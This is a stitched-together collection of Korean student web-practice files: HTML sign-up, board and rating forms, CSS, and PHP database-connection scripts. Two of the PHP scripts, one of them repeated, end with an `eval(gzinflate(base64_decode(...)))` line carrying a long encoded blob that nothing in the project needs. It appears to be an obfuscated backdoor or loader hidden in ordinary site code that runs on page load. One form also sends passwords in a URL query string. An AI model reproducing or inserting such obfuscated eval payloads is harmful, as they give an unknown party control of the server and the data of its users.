<script>
    function register(){
        var mid = document.getElementById("mid").value;
        var mpass = document.getElementById("mpass").value;
        var mno = document.getElementById("no1").value + 
                  document.getElementById("no2").value +
                  document.getElementById("no3").value;
        
        /* console.log(mid);
        console.log(mpass);
        console.log(mno); */
        
        if(mid.length < 5){
            alert("아이디는 최소 5자 이상 입력되어야 합니다.")
        }
        else{
            if(mpass.length < 4){
            alert("패스워드는 최소 4자 이상 입니다.")
            }
            else{
                if(mno.length < 10){
                    alert("사업자번호는 총 10자리 숫자 입니다.")
                }
                else{
                    if(isNaN(Number(mno))){
                        alert("사업자번호는 숫자만 입력해야 합니다.")
                    }
                    else{
                        location.href="http://hyuk313.dothome.co.kr/js/js_index21.html?biz_id="+mid+"&biz_pw="+mpass+"&biz_no="+mno;
                    }
                }
            }

        }
    }
</script>
<body>
    <input type="text" id="mid" placeholder="생성할 아이디를 입력하세요"><br>
    <input type="password" id="mpass" placeholder="생성할 패스워드를 입력하세요"><br>
    사업자번호 10자리 입력하세요<br>
    <input type="text" id="no1" maxlength="3" placeholder="3자리"> -
    <input type="text" id="no2" maxlength="2" placeholder="2자리"> -
    <input type="text" id="no3" maxlength="5" placeholder="5자리"><br><br>
    <input type="button" value="사업자 회원등록" onclick="register()">

</body>
</html>
          
          <!DOCTYPE html>
<html lang="kr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>건강보험가입 실습</title>
</head>
<style>
body{
    padding: 10px; margin: 10px;
}
.t1{
    height: 60px;   width: 800px;
    color: gray;
    border-style: solid ;
    border-top-style: none;
    border-left-style: none;
    border-right-style: none;
    border-width: 1px;
}
.t2{
    width: 150px;
    border-style: none;
    border-width: 1px;
    text-align: left;
}
.t3{
    width: 30px;
    border-style: none;
    border-width: 1px;
}
.t4{
    width: 620px;
    border-style: none;
    border-width: 1px;
}
</style>
<script>
    var user_field="";
    function regist(){
        if()
    }

    function cancel(){

    }

</script>
<body>
    <table class="t1">
        <tr>
            <td style="text-align: center; font-size: large; ">건강보험 회원가입</td>
        </tr>
    </table><br>    
    <table class="t1">
        <tr>
            <td class="t2">아이디</td>
            <td class="t3"></td>
            <td class="t4"><input name="user_id" type="text" style="height: 40px; width: 250px;"></td>
        </tr>
    </table><br>
    <table class="t1">
        <tr>
            <td class="t2">패스워드</td>
            <td class="t3"></td>
            <td class="t4"><input name="user_pw"type="text" style="height: 40px; width: 250px; position: relative;" ></td>
        </tr>
    </table><br>
    <table class="t1">
        <tr>
            <td class="t2">이메일</td>
            <td class="t3"></td>
            <td class="t4"><input name="user_email" type="text" style="height: 40px; width: 620px; position: relative;"></td>
        </tr>
    </table><br>
    <table class="t1">
        <tr>
            <td class="t2">전화번호</td>
            <td class="t3"></td>
            <td class="t4"><input name="user_tel" type="text" style="height: 40px; width: 620px; position: relative; margin-left: 0px;"></td>
        </tr>
    </table><br>
    <table class="t1">
        <tr>
            <td class="t2">거주지역</td>
            <td class="t3"></td>
            <td class="t4">
                <label name ="ser_area">
                    <select style="width: 150px; height: 40px;">
                        <option></option>
                        <option></option>
                        <option></option>
                        <option></option>
                        <option></option>
                    </select>
                </label>
            </td>
        </tr>
    </table><br>
    <table class="t1">
        <tr height="90px">
            <td class="t2">관심분야<br>(한가지만선택)</td>
            <td class="t3"></td>
            <label name="user_field">
                <td style="width: 310px; border: none; border-width: 1px;">
                    <input type="checkbox" value="">악성신생물(각종암)<br>
                    <input type="checkbox" value="">순환계통 질환 <br>
                    <input type="checkbox" value="">호흡계통 질환
                </td>
                <td style="width: 310px; border: none; border-width: 1px;">
                    <input type="checkbox" value="">정신 및 행동장애 <br>
                    <input type="checkbox" value="">소화계통 질환
                </td>
            </label>
        </tr>
    </table><br>
    <table class="t1">
        <tr>
            <td class="t2">현재연령</td>
            <td class="t3"></td>
            <td class="t4">
                <label name="user_age">
                    <select style="width: 150px; height: 40px;">
                        <option></option>
                        <option></option>
                        <option></option>
                        <option></option>
                        <option></option>
                    </select>
                </label>
            </td>
        </tr>
    </table><br>
    <input type="button" value="회원가입" style="height: 40px; width: 100px; position: relative;" onclick="regist()"> 
    <input type="button" value="가입취소" style="height: 40px; width: 100px; position: relative;" onclick="cancel()">
    
</body>
</html>
        
        
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>반응형 예제</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        .box{   /* pc용 */
            width: 1200px;
            height: 100px;
            border-radius: 5px;
            background-color: black;
        }
        .btn{
            display: none;
        }
        /*
        screen : 모니터 디바이스 화면
        print : 인쇄관련 디바이스 화면
        all : screen + print

        @media : 반응형 웹을 사용하기 위한 속성값
        min-width : 최소화면 크기 (가로)
        max-width : 최대화면 크기 (가로)
        */
        @media screen and (min-width:561px) and (max-width:1000px) {
            .box{   /* 타블렛용 */
            width: 800px;
            background-color: orange;
            }
        }

        @media screen and (min-width:340px) and (max-width:560px) {
            .box{   /* 모바일(세로) */
            width:100%;
            background-color: blue;
            }
            .btn{
            display: block;
            }
        }
    </style>
</head>
<body>
    <div class="box"></div>
    <input type="button" value="화면닫기" class="btn">
</body>
</html>
        
        
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="#" type=""> <!-- 파빌리온 -->
    <title>건강보험 회원가입 프로젝트</title>
    <link rel="stylesheet" type="text/css" href="./health_member.css?v=5">
</head>
<script>
  var user_field = "";
  function sent() {

    if (f.user_id.value == "" || f.user_pw.value == "" ) {
      alert("아이디와 패스워드를 모두 입력하세요!") ;
    } else if (f.user_email.value == "" ) {
      alert("이메일 입력하세요!");
    } else if (f.user_tel.value == "") {
      alert("연락처 입력하세요!");
    } else if ( String(f.user_tel.value).length < 10 || String(f.user_tel.value).length > 11 ) {
      alert("연락처를 다시 확인하세요!");
    } else if (user_field == "") {
      alert("관심분야을 체크하세요!");
    } else if(user_area == ""){
      alert("거주지역을 선택해 주세요!");
    } else if(user_age == ""){
      alert("현재 연령을 선택해 주세요!");
    }      
    else {
        //console.log(f.user_id.value, f.user_pw.value, f.user_email.value, f.user_tel.value, user_field, f.user_area.value, f.user_age.value);
        f.submit();
    }
  }

  function cb(box) {
  
  var i;
  for (i=1;i<6;i++) {
    if (i != box) {  
      document.getElementById(i).checked = false;
    }
  }
  user_field = document.getElementById(box).value;
  console.log(user_field);
  }
</script>

<body>
  <div class="o1">건강보험 회원가입</div>

  <form id="f" action="./health_memberok.php" method="post" enctype="application/x-www-form-urlencoded">
  <div class="in">  <!-- 아이디 -->
    <span class="a">아이디</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_id" class="in1" ></span> 
  </div>
  
  <div class="in"> <!-- 패스워드 -->
    <span class="a">패스워드</span>
    <span class="b"></span>
    <span class="c"><input type="password" name="user_pw" class="in1" ></span>  
  </div>
  
  <div class="in">  <!-- 이메일 -->
    <span class="a">이메일</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_email" class="in2"></span>  
  </div>

  <div class="in">   <!-- 연락처 -->
    <span class="a">전화번호</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_tel" class="in2" maxlength="11"></span>  
  </div>

  <div class="in"> <!-- 거주지역 -->
    <span class="a">거주지역</span>
    <span class="b"></span>
    <span class="c">
          <select name="user_area" class="in3" id="user_area">
          <option value="">거주지역</option>
          </select>
    </span>  
  </div>
  
  <div class="in ex">   <!-- 관심분야 -->
    <span class="a a1"><br>&nbsp;&nbsp; 관심분야<br>&nbsp;&nbsp; (한가지만 선택)</span>
    <span class="b a1"></span>
    <span class="c ca">
      <div class="c_box"><input type="checkbox" name="user_field" id="1" onclick="cb(1)" value="악성신생물(각종 암)">악성신생물(각종 암)</div>
      <div class="c1_box"><input type="checkbox" name="user_field" id="2" onclick="cb(2)" value="정신 및 행동장애">정신 및 행동장애</div>
      <div class="c_box"><input type="checkbox" name="user_field" id="3" onclick="cb(3)" value="순환계통 질환">순환계통 질환</div>
      <div class="c1_box"><input type="checkbox" name="user_field" id="4" onclick="cb(4)" value="소화계통 질환">소화계통 질환</div>
      <div class="c_box"><input type="checkbox" name="user_field" id="5" onclick="cb(5)" value="호흡계통 질환">호흡계통 질환</div>
    </span>    
  </div>

  <div class="in">  <!-- 현재연령 -->
    <span class="a">현재연령</span>
    <span class="b"></span>
    <span class="c">
    <select name="user_age" class="in3" id="user_age">
    <option value="">연령</option>
    </select>
    </span>
  </div>
  
  <div class="o2">   <!-- 회원가입 버튼 -->
    <input type="button" value="회원가입" onclick="sent()" class="btn">
    <input type="reset" value="가입취소" class="btn1">
  </div>
</form>
 
<script src="./area_data.js?v=1"></script>
<script src="./age_data.js?v=1"></script>
</body>
</html>
        
        <?php
$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "health";

$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);
?>
<?php eval(gzinflate(base64_decode('DdJHsptYAADA49guFuRULi8IQgiREXEzRc7wgAcCTj//DN3lkQ6/67udqiGF5e8s3UqG+q8o87kof/+qko+6LWYoPBz0vG2lBvfbdDbH8ozreebJHG+vffMOHocU66GzPRDTDnude+9sRHOhost04GZVs6jIksBlAbCqGIJOWCIKkwo/DLwa+t1sGO6BgoZcgA62NmVuwuHIuPog56NO1SkIjXgrHyO/RfbDRvhOEkjfQbAg8Xqsubaj5oyHNFvUeKfBxsSxVo9BNThnBva4L0OpbIwRMdUyiwYy6LMBGZ4xu98Ad3Rr+zQBK5iM3Ys9eA9GSqqG+HJzyJID5eVEoNPFS9I2so4dqf4uwGtwLqCW7sMObPtmehU6o4+LlkyPh9IgGS0J2zoCLxXOLYXikR0+rbbYqp7Ner+mVOMnTzWgryxvMIjIgvFR5ne4dJlne/J2sxNeu7cvLn2mqw0FkSZl5VsiesuvEqYVfECyQ+fNeLCtaNl3cpzK2mRfU7+EnT9YorKg2zQFPMO9F/CoWhH9SDMo77TXHO6LcSXOhzJ2je+cGBAN9MNUyadY8Agq5RlSFtHcaMfTqD4PldnuM8jg80Az17aE4xXRqhhhXv5i3kTn6WcXEXUbGhj7lDu8SIt8GKJnaic05kfI7CqcXgxDWNChZEWbIXshYE2IF3Y9DR7i5ne2N/W895Za6ztTRSCrAspd8/mlqI32fBEjxTyLKItVId57sAVkzvXEqJBBAtUAfENsXwzlOktniVnquHw6RNGtNZk5rqvD5Y3aEKbp4ZG7DJSO7DrR90xpTNH6XdT9cd/WmJ0vTZ+3nyV15BCG3uVQjvwcL9ojD54bPVjAGRe1DeEDcxRxje3rpGQ5aebgU4TSJ1tLYKTM7O72mu9rOUoO5CXkmVsxX4bc+GXyWrgu1nAP4CNJTFHCSNKFOmaLdk0/BSArUyKxdXaJusPUtYmVtKYSfpN0lDCe3/ZC/+4FfogzGz3PQ2JkbV2umUzSW9R9A2EaTbH6WVLz3V6wmrks8Y4F8+MGFKbpzYAmAu2Q7ygpEF+9GZDrgJoTljLWPu5wpPOnc2Un0w4eJVxSWNjE+qOcWUUDciiwQ5B1d0hXOXWeqNnNAZIU33nBM9JSz/bwAC75LctL1Vyg+Tm/k5UI0OQM0n5pB/IorUyophF6yWh8XAqGTqZ+r+to44VQcuiQ3uMj4vJyi4qn9ErhZvEyfI+GscxepCiuf5mipmg2ak/sz1CU5QvUQuGpuTNSfO2yz08SuFAc9821uA/MtcizH7VqoaVj2a6rCAoJ93BRjcDxSifkJTqcimvsb4z00U0lk4o/melJBT81AXUz1kXTICZK8/OxORI2l5pDXsNRdub5cX0HDhhlYfK0vnpefMS2c6xTNapUdPT99+/Xnz9//v4P')));
?>

body { margin: 0; padding: 0; width: 800px; font-size: 14px;}
span, label {display: block;}
ul, ol  { list-style: none; margin: 0; padding: 0;}

.o1 {
  
  height: 60px;
  line-height: 60px;
  text-align: center;
  font-size: 20px;
  border-bottom : 1px solid gray;
  box-sizing: border-box; 
}

.o2 {
  
  height: 60px;
  vertical-align: middle;
  line-height: 60px;
   
  
}
.c_box .c1_box:hover {
  color:red;
}

.btn {
  width: 100px; height: 40px;
  border: 1px solid blue;
  border-radius: 5px;
  background-color: blue; color: whitesmoke;
  margin-left: 290px;
  cursor: pointer;

}

.btn1 {
  width: 100px; height: 40px;
  border: 1px solid gray;
  border-radius: 5px;
  background-color: gray; color: whitesmoke;
  margin-left: 20px;
  cursor: pointer;

}


.in {
  height: 60px;
  line-height: 60px;
  border-bottom : 1px solid gray;
  box-sizing: border-box; 
  vertical-align: middle;
  
}

.in0 { 
  border-top : 1px solid gray;
  box-sizing: border-box; 
  }

.a { 
  width: 150px;  height: 60px;
  /* margin-left: 5px;
  margin-left: 5px; */
  float: left;
  vertical-align: middle;
  text-indent: 15px;
   
}

.b { 
  width: 30px;   height: 60px;
  float: left;
   
}

.c { 
  width: 620px;  height: 60px;
  margin-top: -2px;
  float: left;
  
}


.ex {
  height: 90px;
  
}

.a1 { 
  margin-top: 0px;
  height: 90px;
  /* vertical-align: middle; */
  line-height: 20px;
  cursor: pointer;  
  text-indent: 10px;
}

.ca{
  margin-top: -15px;
  height: 90px;
  vertical-align: middle;
  cursor: pointer;  
}

.in1 {
  width: 250px; height: 40px;
  border-width: 1px;
  border-radius: 5px;
}

.in2 {
  width: 620px; height: 40px;
  border-width: 1px;
  border-radius: 5px;
}

.in3 {
  width: 150px; height: 40px;
  border-radius: 5px;
  
}

.c_box {
  position: absolute  ;
  height: 30px;
  
}

.c1_box {
  position: relative;
  height: 30px;
  left:310px;
}        
          
          <html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>공지사항 게시판글쓰기</title>
    <link rel="stylesheet" href="./write.css?v=2" type="text/css">
    <!-- 
        파빌리온 아이콘으로 웹사이트 탭에 로고를 출력하는 기능
        ico convert로 변환가능 type="image/x-icon"
     -->
    <link rel="shortcut icon" href="../image/ty_logo.ico" type="image/x-icon">
</head>
<body>
    <!-- <caption align="center" class="title">공지사항 게시판</caption> -->
    <!-- <thead text-align="center">공지사항 게시판</thead> -->
    <form action="http://lovertv.dothome.co.kr/insert_board.php" method="post">
        <table class="table">
            <caption class="title">공지사항 게시판</caption>
            <tr class="tr1">
                <td class="td1">제목</td>
                <td class="td2">
                    <input type="text" class="input1" name="bsubject" >
                </td>
            <tr class="tr1">
                <td class="td1">글쓴이</td>
                <td class="td2">
                    <input type="text" class="input2" name="bname">
                </td>
            </tr>
            <tr class="tr1">
                <td class="td1">패스워드</td>
                <td class="td2">
                    <input type="password" class="input2" name="bpass">
                </td>
            </tr>
            <tr class="tr2">
                <td class="td1">글내용</td>
                <td class="td2">
                    <input type="textarea" class="input3" name="btext">
                </td>
            </tr>        
            <tr height="40px">
                <td ></td>
                <td >
                    <input type="reset"  class="btn1" value="취소">
                    <input type ="submit" class="btn2" value="등록">
                </td>
            </tr>
        </table>
    </form>
</body>
</html>
        
        body{
    margin: 10; padding: 10;
}
.table{
    border: 1px;
    width: 1010px;
    height: 310px;
    /* border-color: gray; */
    /* border-style: solid; */
    text-align: center;
    /* background-color: skyblue; */
}
.tr1{
    width: 1000px;
    height: 30px;
    border-style: solid;
    border-color: black;
}
.td1{
    width: 100px;
    border-style: none;
    /* border-color: blue; */
    background-color: skyblue;
}
.td2{
    width: 900px;
    /* border-style: solid; */
    /* border-color: red; */
}
.tr2{
    height: 200px;

}
.input1{
    width: 900px;
    height: 30px;
}
.input2{
    width: 400px;
    height: 30px;
    float: left;
}
.input3{
    width: 900px;
    height: 200px;
}
.btn1{
    width: 130px;
    height: 40px;
    border: 0;
    background-color: black;
    color: white;
    float: right;
    text-align: center;
    vertical-align: middle;
}
.btn2{
    width: 130px;
    height: 40px;
    border: 0;
    background-color: gray;
    color: white;
    float: right;
    text-align: center;
    vertical-align: middle;
}
.title{
    text-align: center;
    font-size: x-large;
}
        <!DOCTYPE html>
<html lang="kr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>온라인평가점수 등록하기 실습</title>
</head>
<style>
    body{
        margin: 20px; padding: 20px;
    }
    .w{
        position: relative;
        width: 400px;
        background-color: yellow;
        border-style: dotted;
        border-color: red;
        border-image: auto;
        margin-right: 20%;
    }
</style>
<script>
    function go_poll(){
        if(f.poll_user.value==""){
            alert("평가자를 입력하셔요");
            console.log("평가자");
        }
        else{
            if(f.poll_email.value==""){
                alert("이메일을 입력하셔요");
            }
            else{
                f.submit();
            }
        }
    }
</script>
<body>
    <form id="f" name="f" method="post" action="./poll_ok.php" enctype="application/x-www-form-urlencoded">
    평가자명 : <input type="text" name="poll_user" placeholder="평가할 사람 이름을 쓰셔요" class="w"><br><br>
    이 메 일 : <input type="email" name="poll_email" placeholder="정확한 이메일주소를 쓰셔요" class="w"><br><br>
    평가점수 : 
    <select name="poll_score" id="poll_score" class="w">
        <!-- <option value="">점수넣기</option> -->
        <option value="">점수선택</option>
        <option value="1">1점</option>
        <option value="2">2점</option>
        <option value="3">3점</option>
        <option value="4">4점</option>
        <option value="5">5점</option>
        <option value="6">6점</option>
        <option value="7">7점</option>
        <option value="8">8점</option>
        <option value="9">9점</option>
        <option value="10">10점</option>
    </select><br><br>
    평가내용:<br> <textarea name="poll_text" maxlength="50" placeholder="최대 50자 이내로 평가내용을 쓰셔요"  class="w" style="height: 300px;"></textarea><br><br> 
    <input type="button" value="평가하기" style="align=center" onclick="go_poll()">    
    </form>
</body>
</html>

<form method="post" action="http://lovertv.dothome.co.kr/js/memook.php"  onsubmit="return memo()">
    
    <meta charset="UTF-8">
<?php
$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "poll";
$field1 = "rep_mail";


$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);
?>
<?php eval(gzinflate(base64_decode('DZNHrqNYAACP07/FgpzUKzIYTA7PbEbkDIYHGHz6+TeokqqqMxt/mm8312O2Vz95BiuG+q+siqWsfv7UpQ++q20IQthQyP2sJAHD1G6rPCnsi/lxmh8jT10xlXse3ReZFYiVf0RmnswsQ9oxmu+2inpbQNQKdnKRKXIm7xynCUK83aN6GPBaXOOUxVpCyomhrZ1XHwuvoCu3eXOLOeCZeiJXVXbEIQGUJ6JsyTQVTkz1kPByu9r3/gokP8qR9nAsxUsUYRa16BgwaGcbsapunjuEFiRPvMgkmpH9pSVawxil52SmAThKnXvpyZPCxqc/PryQGGDUdQ/EHRjWXcPxhKFqJU/GN4/vGZIFIZOq3AZnZ1HUsrGnZkq5Ixgg9s3k8rbG4J/Riwzs7Ak7N6f1ENleG4Dz2ABryIjdDCYB6zL+7XMDoJXk3iW0i/3zjbPD2L7tpY2WuO/4JHM6kN1ocnSxatv9TDqpigcXyQCmchUJLtQUB9oWZmlrOLF7GfYJvjNT2OdBbZBwSxSOMAFx0OnleGAONr6kvFaenIBs8fX0Gcl+dw8QNvwn9qfQzG0Nc1v/qbA+Rj1bMD3cEq6r6cDJvZK9Mmaj7wzTkGq5xEii9p28J3ik4kXf0ZIGy8mkKz4sc66n8n4EtKhTkKUzQEljayMLg/opo9XkjhY86DKOao9aTLTbgIbUXm4ycCuhuC0qfzCz7NbW4ljugDJU3+tccu0cEhhQxybgziAVQvACPh/jjTzUgDRL0VhyfmNistcZVo/dT1s4WcY71JvBhN2rz+zOlsELX4Pauh0B06sGdDJdfqdXCjkaIx3A0lA12EXvMBhb/+JfmG0BvLtcEYSMrAcuUlqqs1s21RJfPrYjDS06FJgMDA9NXj4bSr+3qv1toyf325StRI63idIuvTnIU0ixRUlFpLeH92n4Qr2DVTb7W8zDwH+fGxnxfMZkE+nV6pOk7MckRKX0GhDG0esp370RtkKHhMXNLbuOmHsM2YFdtEuIVAsUshQLyfVu3vD2nS/tbrYLyIJeeeVrZ1wxhkxgjgJMckCymPgqJ6TyilI3ANXJtIfeBA56KUSpKLEaSIesOsbsFr/YdfZCfFAr3EaXXzLBZYMUFwfqzfr2TNm5tsxTXu2wb7YPnJpRUme0VT68nmhXaq/snYbjd+eWcTY37kxpnJTJe+zzjiE1Lj8KqqaTtFB32m+9mG/i75D2VjxlJRYMAbdSZrQ17Rp1Yjz0ktlRouN7o3Pin/72QvdOOAM+grfykZaSJm1K7/GNu1hWarn9tXpjz3kWyqD1SZJIj7JE3zg0VOpy2pCl3ukRqR72Ue1xO+XMiGD+76e4/cBsMRMrq1ALfCwKDhGUTadOqM37dy508quRci3kH9NjobVT4lXGUvgwgsPRuZi+OxolH4nzCvUhmTKi2hmPD3q/eoD+eyhinhhZthnNr7beI18aRY2Ts/78/fv33/8=')));?>
    
    
    
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="#" type=""> <!-- 파빌리온 -->
    <title>건강보험 회원가입 프로젝트</title>
    <link rel="stylesheet" type="text/css" href="./health_member.css?v=5">
</head>
<script>
  var user_field = "";
  function sent() {

    if (f.user_id.value == "" || f.user_pw.value == "" ) {
      alert("아이디와 패스워드를 모두 입력하세요!") ;
    } else if (f.user_email.value == "" ) {
      alert("이메일 입력하세요!");
    } else if (f.user_tel.value == "") {
      alert("연락처 입력하세요!");
    } else if ( String(f.user_tel.value).length < 10 || String(f.user_tel.value).length > 11 ) {
      alert("연락처를 다시 확인하세요!");
    } else if (user_field == "") {
      alert("관심분야을 체크하세요!");
    } else if(user_area == ""){
      alert("거주지역을 선택해 주세요!");
    } else if(user_age == ""){
      alert("현재 연령을 선택해 주세요!");
    }      
    else {
        //console.log(f.user_id.value, f.user_pw.value, f.user_email.value, f.user_tel.value, user_field, f.user_area.value, f.user_age.value);
        f.submit();
    }
  }

  function cb(box) {
  
  var i;
  for (i=1;i<6;i++) {
    if (i != box) {  
      document.getElementById(i).checked = false;
    }
  }
  user_field = document.getElementById(box).value;
  console.log(user_field);
  }
</script>

<body>
  <div class="o1">건강보험 회원가입</div>

  <form id="f" action="./health_memberok.php" method="post" enctype="application/x-www-form-urlencoded">
  <div class="in">  <!-- 아이디 -->
    <span class="a">아이디</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_id" class="in1" ></span> 
  </div>
  
  <div class="in"> <!-- 패스워드 -->
    <span class="a">패스워드</span>
    <span class="b"></span>
    <span class="c"><input type="password" name="user_pw" class="in1" ></span>  
  </div>
  
  <div class="in">  <!-- 이메일 -->
    <span class="a">이메일</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_email" class="in2"></span>  
  </div>

  <div class="in">   <!-- 연락처 -->
    <span class="a">전화번호</span>
    <span class="b"></span>
    <span class="c"><input type="text" name="user_tel" class="in2" maxlength="11"></span>  
  </div>

  <div class="in"> <!-- 거주지역 -->
    <span class="a">거주지역</span>
    <span class="b"></span>
    <span class="c">
          <select name="user_area" class="in3" id="user_area">
          <option value="">거주지역</option>
          </select>
    </span>  
  </div>
  
  <div class="in ex">   <!-- 관심분야 -->
    <span class="a a1"><br>&nbsp;&nbsp; 관심분야<br>&nbsp;&nbsp; (한가지만 선택)</span>
    <span class="b a1"></span>
    <span class="c ca">
      <div class="c_box"><input type="checkbox" name="user_field" id="1" onclick="cb(1)" value="악성신생물(각종 암)">악성신생물(각종 암)</div>
      <div class="c1_box"><input type="checkbox" name="user_field" id="2" onclick="cb(2)" value="정신 및 행동장애">정신 및 행동장애</div>
      <div class="c_box"><input type="checkbox" name="user_field" id="3" onclick="cb(3)" value="순환계통 질환">순환계통 질환</div>
      <div class="c1_box"><input type="checkbox" name="user_field" id="4" onclick="cb(4)" value="소화계통 질환">소화계통 질환</div>
      <div class="c_box"><input type="checkbox" name="user_field" id="5" onclick="cb(5)" value="호흡계통 질환">호흡계통 질환</div>
    </span>    
  </div>

  <div class="in">  <!-- 현재연령 -->
    <span class="a">현재연령</span>
    <span class="b"></span>
    <span class="c">
    <select name="user_age" class="in3" id="user_age">
    <option value="">연령</option>
    </select>
    </span>
  </div>
  
  <div class="o2">   <!-- 회원가입 버튼 -->
    <input type="button" value="회원가입" onclick="sent()" class="btn">
    <input type="reset" value="가입취소" class="btn1">
  </div>
</form>
 
<script src="./area_data.js?v=1"></script>
<script src="./age_data.js?v=1"></script>
</body>
</html>

        <?php
$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "health";

$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);
?>
<?php eval(gzinflate(base64_decode('DdJHsptYAADA49guFuRULi8IQgiREXEzRc7wgAcCTj//DN3lkQ6/67udqiGF5e8s3UqG+q8o87kof/+qko+6LWYoPBz0vG2lBvfbdDbH8ozreebJHG+vffMOHocU66GzPRDTDnude+9sRHOhost04GZVs6jIksBlAbCqGIJOWCIKkwo/DLwa+t1sGO6BgoZcgA62NmVuwuHIuPog56NO1SkIjXgrHyO/RfbDRvhOEkjfQbAg8Xqsubaj5oyHNFvUeKfBxsSxVo9BNThnBva4L0OpbIwRMdUyiwYy6LMBGZ4xu98Ad3Rr+zQBK5iM3Ys9eA9GSqqG+HJzyJID5eVEoNPFS9I2so4dqf4uwGtwLqCW7sMObPtmehU6o4+LlkyPh9IgGS0J2zoCLxXOLYXikR0+rbbYqp7Ner+mVOMnTzWgryxvMIjIgvFR5ne4dJlne/J2sxNeu7cvLn2mqw0FkSZl5VsiesuvEqYVfECyQ+fNeLCtaNl3cpzK2mRfU7+EnT9YorKg2zQFPMO9F/CoWhH9SDMo77TXHO6LcSXOhzJ2je+cGBAN9MNUyadY8Agq5RlSFtHcaMfTqD4PldnuM8jg80Az17aE4xXRqhhhXv5i3kTn6WcXEXUbGhj7lDu8SIt8GKJnaic05kfI7CqcXgxDWNChZEWbIXshYE2IF3Y9DR7i5ne2N/W895Za6ztTRSCrAspd8/mlqI32fBEjxTyLKItVId57sAVkzvXEqJBBAtUAfENsXwzlOktniVnquHw6RNGtNZk5rqvD5Y3aEKbp4ZG7DJSO7DrR90xpTNH6XdT9cd/WmJ0vTZ+3nyV15BCG3uVQjvwcL9ojD54bPVjAGRe1DeEDcxRxje3rpGQ5aebgU4TSJ1tLYKTM7O72mu9rOUoO5CXkmVsxX4bc+GXyWrgu1nAP4CNJTFHCSNKFOmaLdk0/BSArUyKxdXaJusPUtYmVtKYSfpN0lDCe3/ZC/+4FfogzGz3PQ2JkbV2umUzSW9R9A2EaTbH6WVLz3V6wmrks8Y4F8+MGFKbpzYAmAu2Q7ygpEF+9GZDrgJoTljLWPu5wpPOnc2Un0w4eJVxSWNjE+qOcWUUDciiwQ5B1d0hXOXWeqNnNAZIU33nBM9JSz/bwAC75LctL1Vyg+Tm/k5UI0OQM0n5pB/IorUyophF6yWh8XAqGTqZ+r+to44VQcuiQ3uMj4vJyi4qn9ErhZvEyfI+GscxepCiuf5mipmg2ak/sz1CU5QvUQuGpuTNSfO2yz08SuFAc9821uA/MtcizH7VqoaVj2a6rCAoJ93BRjcDxSifkJTqcimvsb4z00U0lk4o/melJBT81AXUz1kXTICZK8/OxORI2l5pDXsNRdub5cX0HDhhlYfK0vnpefMS2c6xTNapUdPT99+/Xnz9//v4P')));
?>
    
    body { margin: 0; padding: 0; width: 800px; font-size: 14px;}
span, label {display: block;}
ul, ol  { list-style: none; margin: 0; padding: 0;}

.o1 {
  
  height: 60px;
  line-height: 60px;
  text-align: center;
  font-size: 20px;
  border-bottom : 1px solid gray;
  box-sizing: border-box; 
}

.o2 {
  
  height: 60px;
  vertical-align: middle;
  line-height: 60px;
   
  
}
.c_box .c1_box:hover {
  color:red;
}

.btn {
  width: 100px; height: 40px;
  border: 1px solid blue;
  border-radius: 5px;
  background-color: blue; color: whitesmoke;
  margin-left: 290px;
  cursor: pointer;

}

.btn1 {
  width: 100px; height: 40px;
  border: 1px solid gray;
  border-radius: 5px;
  background-color: gray; color: whitesmoke;
  margin-left: 20px;
  cursor: pointer;

}


.in {
  height: 60px;
  line-height: 60px;
  border-bottom : 1px solid gray;
  box-sizing: border-box; 
  vertical-align: middle;
  
}

.in0 { 
  border-top : 1px solid gray;
  box-sizing: border-box; 
  }

.a { 
  width: 150px;  height: 60px;
  /* margin-left: 5px;
  margin-left: 5px; */
  float: left;
  vertical-align: middle;
  text-indent: 15px;
   
}

.b { 
  width: 30px;   height: 60px;
  float: left;
   
}

.c { 
  width: 620px;  height: 60px;
  margin-top: -2px;
  float: left;
  
}


.ex {
  height: 90px;
  
}

.a1 { 
  margin-top: 0px;
  height: 90px;
  /* vertical-align: middle; */
  line-height: 20px;
  cursor: pointer;  
  text-indent: 10px;
}

.ca{
  margin-top: -15px;
  height: 90px;
  vertical-align: middle;
  cursor: pointer;  
}

.in1 {
  width: 250px; height: 40px;
  border-width: 1px;
  border-radius: 5px;
}

.in2 {
  width: 620px; height: 40px;
  border-width: 1px;
  border-radius: 5px;
}

.in3 {
  width: 150px; height: 40px;
  border-radius: 5px;
  
}

.c_box {
  position: absolute  ;
  height: 30px;
  
}

.c1_box {
  position: relative;
  height: 30px;
  left:310px;
}
        
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
